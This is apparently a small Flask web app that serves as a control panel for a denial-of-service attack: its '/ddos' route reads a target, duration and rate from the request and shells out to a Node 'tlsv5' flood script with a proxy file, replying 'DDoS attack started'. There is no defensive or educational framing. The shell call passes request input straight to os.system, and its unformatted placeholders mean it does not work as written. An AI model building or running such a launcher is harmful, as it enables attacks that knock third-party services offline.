from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/ddos')
def ddos():
    target = request.args.get('target', 'example.com')
    duration = request.args.get('duration', '10')
    rate = request.args.get('rate', '100')
    os.system("node tlsv5 {target} {duration} {rate} 24 p.txt")

    return 'DDoS attack started'

if __name__ == '__main__':
    app.run(host='localhost', port=3000)
